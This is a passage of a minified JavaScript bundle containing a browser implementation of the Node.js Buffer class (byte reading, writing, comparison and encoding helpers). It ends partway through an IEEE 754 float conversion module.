                                et + tt.length > st.length ? (ee.isBuffer(tt) || (tt = ee.from(tt)),
                                tt.copy(st, et)) : Uint8Array.prototype.set.call(st, tt, et);
                            else {
                                if (!ee.isBuffer(tt))
                                    throw new TypeError('"list" argument must be an Array of Buffers');
                                tt.copy(st, et)
                            }
                            et += tt.length
                        }
                        return st
                    }
                    ,
                    ee.byteLength = pe,
                    ee.prototype._isBuffer = !0,
                    ee.prototype.swap16 = function() {
                        const we = this.length;
                        if (we % 2 != 0)
                            throw new RangeError("Buffer size must be a multiple of 16-bits");
                        for (let _e = 0; _e < we; _e += 2)
                            be(this, _e, _e + 1);
                        return this
                    }
                    ,
                    ee.prototype.swap32 = function() {
                        const we = this.length;
                        if (we % 4 != 0)
                            throw new RangeError("Buffer size must be a multiple of 32-bits");
                        for (let _e = 0; _e < we; _e += 4)
                            be(this, _e, _e + 3),
                            be(this, _e + 1, _e + 2);
                        return this
                    }
                    ,
                    ee.prototype.swap64 = function() {
                        const we = this.length;
                        if (we % 8 != 0)
                            throw new RangeError("Buffer size must be a multiple of 64-bits");
                        for (let _e = 0; _e < we; _e += 8)
                            be(this, _e, _e + 7),
                            be(this, _e + 1, _e + 6),
                            be(this, _e + 2, _e + 5),
                            be(this, _e + 3, _e + 4);
                        return this
                    }
                    ,
                    ee.prototype.toString = function() {
                        const we = this.length;
                        return we === 0 ? "" : arguments.length === 0 ? Z(this, 0, we) : ye.apply(this, arguments)
                    }
                    ,
                    ee.prototype.toLocaleString = ee.prototype.toString,
                    ee.prototype.equals = function(we) {
                        if (!ee.isBuffer(we))
                            throw new TypeError("Argument must be a Buffer");
                        return this === we || ee.compare(this, we) === 0
                    }
                    ,
                    ee.prototype.inspect = function() {
                        let we = "";
                        const _e = b.IS;
                        return we = this.toString("hex", 0, _e).replace(/(.{2})/g, "$1 ").trim(),
                        this.length > _e && (we += " ... "),
                        "<Buffer " + we + ">"
                    }
                    ,
                    V && (ee.prototype[V] = ee.prototype.inspect),
                    ee.prototype.compare = function(we, _e, Ce, st, et) {
                        if (Qe(we, Uint8Array) && (we = ee.from(we, we.offset, we.byteLength)),
                        !ee.isBuffer(we))
                            throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof we);
                        if (_e === void 0 && (_e = 0),
                        Ce === void 0 && (Ce = we ? we.length : 0),
                        st === void 0 && (st = 0),
                        et === void 0 && (et = this.length),
                        _e < 0 || Ce > we.length || st < 0 || et > this.length)
                            throw new RangeError("out of range index");
                        if (st >= et && _e >= Ce)
                            return 0;
                        if (st >= et)
                            return -1;
                        if (_e >= Ce)
                            return 1;
                        if (this === we)
                            return 0;
                        let tt = (et >>>= 0) - (st >>>= 0)
                          , He = (Ce >>>= 0) - (_e >>>= 0);
                        const ke = Math.min(tt, He)
                          , Me = this.slice(st, et)
                          , Ue = we.slice(_e, Ce);
                        for (let rt = 0; rt < ke; ++rt)
                            if (Me[rt] !== Ue[rt]) {
                                tt = Me[rt],
                                He = Ue[rt];
                                break
                            }
                        return tt < He ? -1 : He < tt ? 1 : 0
                    }
                    ,
                    ee.prototype.includes = function(we, _e, Ce) {
                        return this.indexOf(we, _e, Ce) !== -1
                    }
                    ,
                    ee.prototype.indexOf = function(we, _e, Ce) {
                        return xe(this, we, _e, Ce, !0)
                    }
                    ,
                    ee.prototype.lastIndexOf = function(we, _e, Ce) {
                        return xe(this, we, _e, Ce, !1)
                    }
                    ,
                    ee.prototype.write = function(we, _e, Ce, st) {
                        if (_e === void 0)
                            st = "utf8",
                            Ce = this.length,
                            _e = 0;
                        else if (Ce === void 0 && typeof _e == "string")
                            st = _e,
                            Ce = this.length,
                            _e = 0;
                        else {
                            if (!isFinite(_e))
                                throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
                            _e >>>= 0,
                            isFinite(Ce) ? (Ce >>>= 0,
                            st === void 0 && (st = "utf8")) : (st = Ce,
                            Ce = void 0)
                        }
                        const et = this.length - _e;
                        if ((Ce === void 0 || Ce > et) && (Ce = et),
                        we.length > 0 && (Ce < 0 || _e < 0) || _e > this.length)
                            throw new RangeError("Attempt to write outside buffer bounds");
                        st || (st = "utf8");
                        let tt = !1;
                        for (; ; )
                            switch (st) {
                            case "hex":
                                return Ee(this, we, _e, Ce);
                            case "utf8":
                            case "utf-8":
                                return Be(this, we, _e, Ce);
                            case "ascii":
                            case "latin1":
                            case "binary":
                                return ce(this, we, _e, Ce);
                            case "base64":
                                return q(this, we, _e, Ce);
                            case "ucs2":
                            case "ucs-2":
                            case "utf16le":
                            case "utf-16le":
                                return L(this, we, _e, Ce);
                            default:
                                if (tt)
                                    throw new TypeError("Unknown encoding: " + st);
                                st = ("" + st).toLowerCase(),
                                tt = !0
                            }
                    }
                    ,
                    ee.prototype.toJSON = function() {
                        return {
                            type: "Buffer",
                            data: Array.prototype.slice.call(this._arr || this, 0)
                        }
                    }
                    ;
                    const te = 4096;
                    function se(we, _e, Ce) {
                        let st = "";
                        Ce = Math.min(we.length, Ce);
                        for (let et = _e; et < Ce; ++et)
                            st += String.fromCharCode(127 & we[et]);
                        return st
                    }
                    function de(we, _e, Ce) {
                        let st = "";
                        Ce = Math.min(we.length, Ce);
                        for (let et = _e; et < Ce; ++et)
                            st += String.fromCharCode(we[et]);
                        return st
                    }
                    function re(we, _e, Ce) {
                        const st = we.length;
                        (!_e || _e < 0) && (_e = 0),
                        (!Ce || Ce < 0 || Ce > st) && (Ce = st);
                        let et = "";
                        for (let tt = _e; tt < Ce; ++tt)
                            et += mt[we[tt]];
                        return et
                    }
                    function $(we, _e, Ce) {
                        const st = we.slice(_e, Ce);
                        let et = "";
                        for (let tt = 0; tt < st.length - 1; tt += 2)
                            et += String.fromCharCode(st[tt] + 256 * st[tt + 1]);
                        return et
                    }
                    function ie(we, _e, Ce) {
                        if (we % 1 != 0 || we < 0)
                            throw new RangeError("offset is not uint");
                        if (we + _e > Ce)
                            throw new RangeError("Trying to access beyond buffer length")
                    }
                    function ve(we, _e, Ce, st, et, tt) {
                        if (!ee.isBuffer(we))
                            throw new TypeError('"buffer" argument must be a Buffer instance');
                        if (_e > et || _e < tt)
                            throw new RangeError('"value" argument is out of bounds');
                        if (Ce + st > we.length)
                            throw new RangeError("Index out of range")
                    }
                    function ge(we, _e, Ce, st, et) {
                        Ne(_e, st, et, we, Ce, 7);
                        let tt = Number(_e & BigInt(4294967295));
                        we[Ce++] = tt,
                        tt >>= 8,
                        we[Ce++] = tt,
                        tt >>= 8,
                        we[Ce++] = tt,
                        tt >>= 8,
                        we[Ce++] = tt;
                        let He = Number(_e >> BigInt(32) & BigInt(4294967295));
                        return we[Ce++] = He,
                        He >>= 8,
                        we[Ce++] = He,
                        He >>= 8,
                        we[Ce++] = He,
                        He >>= 8,
                        we[Ce++] = He,
                        Ce
                    }
                    function Re(we, _e, Ce, st, et) {
                        Ne(_e, st, et, we, Ce, 7);
                        let tt = Number(_e & BigInt(4294967295));
                        we[Ce + 7] = tt,
                        tt >>= 8,
                        we[Ce + 6] = tt,
                        tt >>= 8,
                        we[Ce + 5] = tt,
                        tt >>= 8,
                        we[Ce + 4] = tt;
                        let He = Number(_e >> BigInt(32) & BigInt(4294967295));
                        return we[Ce + 3] = He,
                        He >>= 8,
                        we[Ce + 2] = He,
                        He >>= 8,
                        we[Ce + 1] = He,
                        He >>= 8,
                        we[Ce] = He,
                        Ce + 8
                    }
                    function Pe(we, _e, Ce, st, et, tt) {
                        if (Ce + st > we.length)
                            throw new RangeError("Index out of range");
                        if (Ce < 0)
                            throw new RangeError("Index out of range")
                    }
                    function Ie(we, _e, Ce, st, et) {
                        return _e = +_e,
                        Ce >>>= 0,
                        et || Pe(we, 0, Ce, 4),
                        F.write(we, _e, Ce, st, 23, 4),
                        Ce + 4
                    }
                    function Te(we, _e, Ce, st, et) {
                        return _e = +_e,
                        Ce >>>= 0,
                        et || Pe(we, 0, Ce, 8),
                        F.write(we, _e, Ce, st, 52, 8),
                        Ce + 8
                    }
                    ee.prototype.slice = function(we, _e) {
                        const Ce = this.length;
                        (we = ~~we) < 0 ? (we += Ce) < 0 && (we = 0) : we > Ce && (we = Ce),
                        (_e = _e === void 0 ? Ce : ~~_e) < 0 ? (_e += Ce) < 0 && (_e = 0) : _e > Ce && (_e = Ce),
                        _e < we && (_e = we);
                        const st = this.subarray(we, _e);
                        return Object.setPrototypeOf(st, ee.prototype),
                        st
                    }
                    ,
                    ee.prototype.readUintLE = ee.prototype.readUIntLE = function(we, _e, Ce) {
                        we >>>= 0,
                        _e >>>= 0,
                        Ce || ie(we, _e, this.length);
                        let st = this[we]
                          , et = 1
                          , tt = 0;
                        for (; ++tt < _e && (et *= 256); )
                            st += this[we + tt] * et;
                        return st
                    }
                    ,
                    ee.prototype.readUintBE = ee.prototype.readUIntBE = function(we, _e, Ce) {
                        we >>>= 0,
                        _e >>>= 0,
                        Ce || ie(we, _e, this.length);
                        let st = this[we + --_e]
                          , et = 1;
                        for (; _e > 0 && (et *= 256); )
                            st += this[we + --_e] * et;
                        return st
                    }
                    ,
                    ee.prototype.readUint8 = ee.prototype.readUInt8 = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 1, this.length),
                        this[we]
                    }
                    ,
                    ee.prototype.readUint16LE = ee.prototype.readUInt16LE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 2, this.length),
                        this[we] | this[we + 1] << 8
                    }
                    ,
                    ee.prototype.readUint16BE = ee.prototype.readUInt16BE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 2, this.length),
                        this[we] << 8 | this[we + 1]
                    }
                    ,
                    ee.prototype.readUint32LE = ee.prototype.readUInt32LE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 4, this.length),
                        (this[we] | this[we + 1] << 8 | this[we + 2] << 16) + 16777216 * this[we + 3]
                    }
                    ,
                    ee.prototype.readUint32BE = ee.prototype.readUInt32BE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 4, this.length),
                        16777216 * this[we] + (this[we + 1] << 16 | this[we + 2] << 8 | this[we + 3])
                    }
                    ,
                    ee.prototype.readBigUInt64LE = ct(function(we) {
                        qe(we >>>= 0, "offset");
                        const _e = this[we]
                          , Ce = this[we + 7];
                        _e !== void 0 && Ce !== void 0 || Ve(we, this.length - 8);
                        const st = _e + 256 * this[++we] + 65536 * this[++we] + this[++we] * 2 ** 24
                          , et = this[++we] + 256 * this[++we] + 65536 * this[++we] + Ce * 2 ** 24;
                        return BigInt(st) + (BigInt(et) << BigInt(32))
                    }),
                    ee.prototype.readBigUInt64BE = ct(function(we) {
                        qe(we >>>= 0, "offset");
                        const _e = this[we]
                          , Ce = this[we + 7];
                        _e !== void 0 && Ce !== void 0 || Ve(we, this.length - 8);
                        const st = _e * 2 ** 24 + 65536 * this[++we] + 256 * this[++we] + this[++we]
                          , et = this[++we] * 2 ** 24 + 65536 * this[++we] + 256 * this[++we] + Ce;
                        return (BigInt(st) << BigInt(32)) + BigInt(et)
                    }),
                    ee.prototype.readIntLE = function(we, _e, Ce) {
                        we >>>= 0,
                        _e >>>= 0,
                        Ce || ie(we, _e, this.length);
                        let st = this[we]
                          , et = 1
                          , tt = 0;
                        for (; ++tt < _e && (et *= 256); )
                            st += this[we + tt] * et;
                        return et *= 128,
                        st >= et && (st -= Math.pow(2, 8 * _e)),
                        st
                    }
                    ,
                    ee.prototype.readIntBE = function(we, _e, Ce) {
                        we >>>= 0,
                        _e >>>= 0,
                        Ce || ie(we, _e, this.length);
                        let st = _e
                          , et = 1
                          , tt = this[we + --st];
                        for (; st > 0 && (et *= 256); )
                            tt += this[we + --st] * et;
                        return et *= 128,
                        tt >= et && (tt -= Math.pow(2, 8 * _e)),
                        tt
                    }
                    ,
                    ee.prototype.readInt8 = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 1, this.length),
                        128 & this[we] ? -1 * (255 - this[we] + 1) : this[we]
                    }
                    ,
                    ee.prototype.readInt16LE = function(we, _e) {
                        we >>>= 0,
                        _e || ie(we, 2, this.length);
                        const Ce = this[we] | this[we + 1] << 8;
                        return 32768 & Ce ? 4294901760 | Ce : Ce
                    }
                    ,
                    ee.prototype.readInt16BE = function(we, _e) {
                        we >>>= 0,
                        _e || ie(we, 2, this.length);
                        const Ce = this[we + 1] | this[we] << 8;
                        return 32768 & Ce ? 4294901760 | Ce : Ce
                    }
                    ,
                    ee.prototype.readInt32LE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 4, this.length),
                        this[we] | this[we + 1] << 8 | this[we + 2] << 16 | this[we + 3] << 24
                    }
                    ,
                    ee.prototype.readInt32BE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 4, this.length),
                        this[we] << 24 | this[we + 1] << 16 | this[we + 2] << 8 | this[we + 3]
                    }
                    ,
                    ee.prototype.readBigInt64LE = ct(function(we) {
                        qe(we >>>= 0, "offset");
                        const _e = this[we]
                          , Ce = this[we + 7];
                        _e !== void 0 && Ce !== void 0 || Ve(we, this.length - 8);
                        const st = this[we + 4] + 256 * this[we + 5] + 65536 * this[we + 6] + (Ce << 24);
                        return (BigInt(st) << BigInt(32)) + BigInt(_e + 256 * this[++we] + 65536 * this[++we] + this[++we] * 16777216)
                    }),
                    ee.prototype.readBigInt64BE = ct(function(we) {
                        qe(we >>>= 0, "offset");
                        const _e = this[we]
                          , Ce = this[we + 7];
                        _e !== void 0 && Ce !== void 0 || Ve(we, this.length - 8);
                        const st = (_e << 24) + 65536 * this[++we] + 256 * this[++we] + this[++we];
                        return (BigInt(st) << BigInt(32)) + BigInt(this[++we] * 16777216 + 65536 * this[++we] + 256 * this[++we] + Ce)
                    }),
                    ee.prototype.readFloatLE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 4, this.length),
                        F.read(this, we, !0, 23, 4)
                    }
                    ,
                    ee.prototype.readFloatBE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 4, this.length),
                        F.read(this, we, !1, 23, 4)
                    }
                    ,
                    ee.prototype.readDoubleLE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 8, this.length),
                        F.read(this, we, !0, 52, 8)
                    }
                    ,
                    ee.prototype.readDoubleBE = function(we, _e) {
                        return we >>>= 0,
                        _e || ie(we, 8, this.length),
                        F.read(this, we, !1, 52, 8)
                    }
                    ,
                    ee.prototype.writeUintLE = ee.prototype.writeUIntLE = function(we, _e, Ce, st) {
                        we = +we,
                        _e >>>= 0,
                        Ce >>>= 0,
                        !st && ve(this, we, _e, Ce, Math.pow(2, 8 * Ce) - 1, 0);
                        let et = 1
                          , tt = 0;
                        for (this[_e] = 255 & we; ++tt < Ce && (et *= 256); )
                            this[_e + tt] = we / et & 255;
                        return _e + Ce
                    }
                    ,
                    ee.prototype.writeUintBE = ee.prototype.writeUIntBE = function(we, _e, Ce, st) {
                        we = +we,
                        _e >>>= 0,
                        Ce >>>= 0,
                        !st && ve(this, we, _e, Ce, Math.pow(2, 8 * Ce) - 1, 0);
                        let et = Ce - 1
                          , tt = 1;
                        for (this[_e + et] = 255 & we; --et >= 0 && (tt *= 256); )
                            this[_e + et] = we / tt & 255;
                        return _e + Ce
                    }
                    ,
                    ee.prototype.writeUint8 = ee.prototype.writeUInt8 = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 1, 255, 0),
                        this[_e] = 255 & we,
                        _e + 1
                    }
                    ,
                    ee.prototype.writeUint16LE = ee.prototype.writeUInt16LE = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 2, 65535, 0),
                        this[_e] = 255 & we,
                        this[_e + 1] = we >>> 8,
                        _e + 2
                    }
                    ,
                    ee.prototype.writeUint16BE = ee.prototype.writeUInt16BE = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 2, 65535, 0),
                        this[_e] = we >>> 8,
                        this[_e + 1] = 255 & we,
                        _e + 2
                    }
                    ,
                    ee.prototype.writeUint32LE = ee.prototype.writeUInt32LE = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 4, 4294967295, 0),
                        this[_e + 3] = we >>> 24,
                        this[_e + 2] = we >>> 16,
                        this[_e + 1] = we >>> 8,
                        this[_e] = 255 & we,
                        _e + 4
                    }
                    ,
                    ee.prototype.writeUint32BE = ee.prototype.writeUInt32BE = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 4, 4294967295, 0),
                        this[_e] = we >>> 24,
                        this[_e + 1] = we >>> 16,
                        this[_e + 2] = we >>> 8,
                        this[_e + 3] = 255 & we,
                        _e + 4
                    }
                    ,
                    ee.prototype.writeBigUInt64LE = ct(function(we, _e=0) {
                        return ge(this, we, _e, BigInt(0), BigInt("0xffffffffffffffff"))
                    }),
                    ee.prototype.writeBigUInt64BE = ct(function(we, _e=0) {
                        return Re(this, we, _e, BigInt(0), BigInt("0xffffffffffffffff"))
                    }),
                    ee.prototype.writeIntLE = function(we, _e, Ce, st) {
                        if (we = +we,
                        _e >>>= 0,
                        !st) {
                            const ke = Math.pow(2, 8 * Ce - 1);
                            ve(this, we, _e, Ce, ke - 1, -ke)
                        }
                        let et = 0
                          , tt = 1
                          , He = 0;
                        for (this[_e] = 255 & we; ++et < Ce && (tt *= 256); )
                            we < 0 && He === 0 && this[_e + et - 1] !== 0 && (He = 1),
                            this[_e + et] = (we / tt | 0) - He & 255;
                        return _e + Ce
                    }
                    ,
                    ee.prototype.writeIntBE = function(we, _e, Ce, st) {
                        if (we = +we,
                        _e >>>= 0,
                        !st) {
                            const ke = Math.pow(2, 8 * Ce - 1);
                            ve(this, we, _e, Ce, ke - 1, -ke)
                        }
                        let et = Ce - 1
                          , tt = 1
                          , He = 0;
                        for (this[_e + et] = 255 & we; --et >= 0 && (tt *= 256); )
                            we < 0 && He === 0 && this[_e + et + 1] !== 0 && (He = 1),
                            this[_e + et] = (we / tt | 0) - He & 255;
                        return _e + Ce
                    }
                    ,
                    ee.prototype.writeInt8 = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 1, 127, -128),
                        we < 0 && (we = 255 + we + 1),
                        this[_e] = 255 & we,
                        _e + 1
                    }
                    ,
                    ee.prototype.writeInt16LE = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 2, 32767, -32768),
                        this[_e] = 255 & we,
                        this[_e + 1] = we >>> 8,
                        _e + 2
                    }
                    ,
                    ee.prototype.writeInt16BE = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 2, 32767, -32768),
                        this[_e] = we >>> 8,
                        this[_e + 1] = 255 & we,
                        _e + 2
                    }
                    ,
                    ee.prototype.writeInt32LE = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 4, 2147483647, -2147483648),
                        this[_e] = 255 & we,
                        this[_e + 1] = we >>> 8,
                        this[_e + 2] = we >>> 16,
                        this[_e + 3] = we >>> 24,
                        _e + 4
                    }
                    ,
                    ee.prototype.writeInt32BE = function(we, _e, Ce) {
                        return we = +we,
                        _e >>>= 0,
                        Ce || ve(this, we, _e, 4, 2147483647, -2147483648),
                        we < 0 && (we = 4294967295 + we + 1),
                        this[_e] = we >>> 24,
                        this[_e + 1] = we >>> 16,
                        this[_e + 2] = we >>> 8,
                        this[_e + 3] = 255 & we,
                        _e + 4
                    }
                    ,
                    ee.prototype.writeBigInt64LE = ct(function(we, _e=0) {
                        return ge(this, we, _e, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
                    }),
                    ee.prototype.writeBigInt64BE = ct(function(we, _e=0) {
                        return Re(this, we, _e, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
                    }),
                    ee.prototype.writeFloatLE = function(we, _e, Ce) {
                        return Ie(this, we, _e, !0, Ce)
                    }
                    ,
                    ee.prototype.writeFloatBE = function(we, _e, Ce) {
                        return Ie(this, we, _e, !1, Ce)
                    }
                    ,
                    ee.prototype.writeDoubleLE = function(we, _e, Ce) {
                        return Te(this, we, _e, !0, Ce)
                    }
                    ,
                    ee.prototype.writeDoubleBE = function(we, _e, Ce) {
                        return Te(this, we, _e, !1, Ce)
                    }
                    ,
                    ee.prototype.copy = function(we, _e, Ce, st) {
                        if (!ee.isBuffer(we))
                            throw new TypeError("argument should be a Buffer");
                        if (Ce || (Ce = 0),
                        st || st === 0 || (st = this.length),
                        _e >= we.length && (_e = we.length),
                        _e || (_e = 0),
                        st > 0 && st < Ce && (st = Ce),
                        st === Ce || we.length === 0 || this.length === 0)
                            return 0;
                        if (_e < 0)
                            throw new RangeError("targetStart out of bounds");
                        if (Ce < 0 || Ce >= this.length)
                            throw new RangeError("Index out of range");
                        if (st < 0)
                            throw new RangeError("sourceEnd out of bounds");
                        st > this.length && (st = this.length),
                        we.length - _e < st - Ce && (st = we.length - _e + Ce);
                        const et = st - Ce;
                        return this === we && typeof Uint8Array.prototype.copyWithin == "function" ? this.copyWithin(_e, Ce, st) : Uint8Array.prototype.set.call(we, this.subarray(Ce, st), _e),
                        et
                    }
                    ,
                    ee.prototype.fill = function(we, _e, Ce, st) {
                        if (typeof we == "string") {
                            if (typeof _e == "string" ? (st = _e,
                            _e = 0,
                            Ce = this.length) : typeof Ce == "string" && (st = Ce,
                            Ce = this.length),
                            st !== void 0 && typeof st != "string")
                                throw new TypeError("encoding must be a string");
                            if (typeof st == "string" && !ee.isEncoding(st))
                                throw new TypeError("Unknown encoding: " + st);
                            if (we.length === 1) {
                                const tt = we.charCodeAt(0);
                                (st === "utf8" && tt < 128 || st === "latin1") && (we = tt)
                            }
                        } else
                            typeof we == "number" ? we &= 255 : typeof we == "boolean" && (we = Number(we));
                        if (_e < 0 || this.length < _e || this.length < Ce)
                            throw new RangeError("Out of range index");
                        if (Ce <= _e)
                            return this;
                        let et;
                        if (_e >>>= 0,
                        Ce = Ce === void 0 ? this.length : Ce >>> 0,
                        we || (we = 0),
                        typeof we == "number")
                            for (et = _e; et < Ce; ++et)
                                this[et] = we;
                        else {
                            const tt = ee.isBuffer(we) ? we : ee.from(we, st)
                              , He = tt.length;
                            if (He === 0)
                                throw new TypeError('The value "' + we + '" is invalid for argument "value"');
                            for (et = 0; et < Ce - _e; ++et)
                                this[et + _e] = tt[et % He]
                        }
                        return this
                    }
                    ;
                    const Le = {};
                    function Ze(we, _e, Ce) {
                        Le[we] = class extends Ce {
                            constructor() {
                                super(),
                                Object.defineProperty(this, "message", {
                                    value: _e.apply(this, arguments),
                                    writable: !0,
                                    configurable: !0
                                }),
                                this.name = `${this.name} [${we}]`,
                                this.stack,
                                delete this.name
                            }
                            get code() {
                                return we
                            }
                            set code(st) {
                                Object.defineProperty(this, "code", {
                                    configurable: !0,
                                    enumerable: !0,
                                    value: st,
                                    writable: !0
                                })
                            }
                            toString() {
                                return `${this.name} [${we}]: ${this.message}`
                            }
                        }
                    }
                    function $e(we) {
                        let _e = ""
                          , Ce = we.length;
                        const st = we[0] === "-" ? 1 : 0;
                        for (; Ce >= st + 4; Ce -= 3)
                            _e = `_${we.slice(Ce - 3, Ce)}${_e}`;
                        return `${we.slice(0, Ce)}${_e}`
                    }
                    function Ne(we, _e, Ce, st, et, tt) {
                        if (we > Ce || we < _e) {
                            const He = typeof _e == "bigint" ? "n" : "";
                            let ke;
                            throw ke = _e === 0 || _e === BigInt(0) ? `>= 0${He} and < 2${He} ** ${8 * (tt + 1)}${He}` : `>= -(2${He} ** ${8 * (tt + 1) - 1}${He}) and < 2 ** ${8 * (tt + 1) - 1}${He}`,
                            new Le.ERR_OUT_OF_RANGE("value",ke,we)
                        }
                        (function(He, ke, Me) {
                            qe(ke, "offset"),
                            He[ke] !== void 0 && He[ke + Me] !== void 0 || Ve(ke, He.length - (Me + 1))
                        }
                        )(st, et, tt)
                    }
                    function qe(we, _e) {
                        if (typeof we != "number")
                            throw new Le.ERR_INVALID_ARG_TYPE(_e,"number",we)
                    }
                    function Ve(we, _e, Ce) {
                        throw Math.floor(we) !== we ? (qe(we, Ce),
                        new Le.ERR_OUT_OF_RANGE("offset","an integer",we)) : _e < 0 ? new Le.ERR_BUFFER_OUT_OF_BOUNDS : new Le.ERR_OUT_OF_RANGE("offset",`>= 0 and <= ${_e}`,we)
                    }
                    Ze("ERR_BUFFER_OUT_OF_BOUNDS", function(we) {
                        return we ? `${we} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds"
                    }, RangeError),
                    Ze("ERR_INVALID_ARG_TYPE", function(we, _e) {
                        return `The "${we}" argument must be of type number. Received type ${typeof _e}`
                    }, TypeError),
                    Ze("ERR_OUT_OF_RANGE", function(we, _e, Ce) {
                        let st = `The value of "${we}" is out of range.`
                          , et = Ce;
                        return Number.isInteger(Ce) && Math.abs(Ce) > 4294967296 ? et = $e(String(Ce)) : typeof Ce == "bigint" && (et = String(Ce),
                        (Ce > BigInt(2) ** BigInt(32) || Ce < -(BigInt(2) ** BigInt(32))) && (et = $e(et)),
                        et += "n"),
                        st += ` It must be ${_e}. Received ${et}`,
                        st
                    }, RangeError);
                    const lt = /[^+/0-9A-Za-z-_]/g;
                    function nt(we, _e) {
                        let Ce;
                        _e = _e || 1 / 0;
                        const st = we.length;
                        let et = null;
                        const tt = [];
                        for (let He = 0; He < st; ++He) {
                            if (Ce = we.charCodeAt(He),
                            Ce > 55295 && Ce < 57344) {
                                if (!et) {
                                    if (Ce > 56319) {
                                        (_e -= 3) > -1 && tt.push(239, 191, 189);
                                        continue
                                    }
                                    if (He + 1 === st) {
                                        (_e -= 3) > -1 && tt.push(239, 191, 189);
                                        continue
                                    }
                                    et = Ce;
                                    continue
                                }
                                if (Ce < 56320) {
                                    (_e -= 3) > -1 && tt.push(239, 191, 189),
                                    et = Ce;
                                    continue
                                }
                                Ce = 65536 + (et - 55296 << 10 | Ce - 56320)
                            } else
                                et && (_e -= 3) > -1 && tt.push(239, 191, 189);
                            if (et = null,
                            Ce < 128) {
                                if ((_e -= 1) < 0)
                                    break;
                                tt.push(Ce)
                            } else if (Ce < 2048) {
                                if ((_e -= 2) < 0)
                                    break;
                                tt.push(Ce >> 6 | 192, 63 & Ce | 128)
                            } else if (Ce < 65536) {
                                if ((_e -= 3) < 0)
                                    break;
                                tt.push(Ce >> 12 | 224, Ce >> 6 & 63 | 128, 63 & Ce | 128)
                            } else {
                                if (!(Ce < 1114112))
                                    throw new Error("Invalid code point");
                                if ((_e -= 4) < 0)
                                    break;
                                tt.push(Ce >> 18 | 240, Ce >> 12 & 63 | 128, Ce >> 6 & 63 | 128, 63 & Ce | 128)
                            }
                        }
                        return tt
                    }
                    function je(we) {
                        return Y.toByteArray(function(_e) {
                            if ((_e = (_e = _e.split("=")[0]).trim().replace(lt, "")).length < 2)
                                return "";
                            for (; _e.length % 4 != 0; )
                                _e += "=";
                            return _e
                        }(we))
                    }
                    function Ke(we, _e, Ce, st) {
                        let et;
                        for (et = 0; et < st && !(et + Ce >= _e.length || et >= we.length); ++et)
                            _e[et + Ce] = we[et];
                        return et
                    }
                    function Qe(we, _e) {
                        return we instanceof _e || we != null && we.constructor != null && we.constructor.name != null && we.constructor.name === _e.name
                    }
                    function We(we) {
                        return we != we
                    }
                    const mt = function() {
                        const we = "0123456789abcdef"
                          , _e = new Array(256);
                        for (let Ce = 0; Ce < 16; ++Ce) {
                            const st = 16 * Ce;
                            for (let et = 0; et < 16; ++et)
                                _e[st + et] = we[Ce] + we[et]
                        }
                        return _e
                    }();
                    function ct(we) {
                        return typeof BigInt > "u" ? vt : we
                    }
                    function vt() {
                        throw new Error("BigInt not supported")
                    }
                }
                ,
                251: (w, b) => {
                    b.read = function(X, Y, F, V, K) {
                        var Q, ee, ae = 8 * K - V - 1, ne = (1 << ae) - 1, oe = ne >> 1, ue = -7, fe = F ? K - 1 : 0, he = F ? -1 : 1, pe = X[Y + fe];
                        for (fe += he,
                        Q = pe & (1 << -ue) - 1,
                        pe >>= -ue,
                        ue += ae; ue > 0; Q = 256 * Q + X[Y + fe],
                        fe += he,
                        ue -= 8)
                            ;
                        for (ee = Q & (1 << -ue) - 1,
                        Q >>= -ue,
                        ue += V; ue > 0; ee = 256 * ee + X[Y + fe],
                        fe += he,
                        ue -= 8)
                            ;
                        if (Q === 0)
                            Q = 1 - oe;
                        else {
                            if (Q === ne)
                                return ee ? NaN : 1 / 0 * (pe ? -1 : 1);
                            ee += Math.pow(2, V),
                            Q -= oe
                        }
                        return (pe ? -1 : 1) * ee * Math.pow(2, Q - V)
                    }
                    ,
                    b.write = function(X, Y, F, V, K, Q) {
                        var ee, ae, ne, oe = 8 * Q - K - 1, ue = (1 << oe) - 1, fe = ue >> 1, he = K === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0, pe = V ? 0 : Q - 1, ye = V ? 1 : -1, be = Y < 0 || Y === 0 && 1 / Y < 0 ? 1 : 0;
                        for (Y = Math.abs(Y),
                        isNaN(Y) || Y === 1 / 0 ? (ae = isNaN(Y) ? 1 : 0,
                        ee = ue) : (ee = Math.floor(Math.log(Y) / Math.LN2),
                        Y * (ne = Math.pow(2, -ee)) < 1 && (ee--,
                        ne *= 2),
                        (Y += ee + fe >= 1 ? he / ne : he * Math.pow(2, 1 - fe)) * ne >= 2 && (ee++,
                        ne /= 2),
                        ee + fe >= ue ? (ae = 0,
                        ee = ue) : ee + fe >= 1 ? (ae = (Y * ne - 1) * Math.pow(2, K),
                        ee += fe) : (ae = Y * Math.pow(2, fe - 1) * Math.pow(2, K),
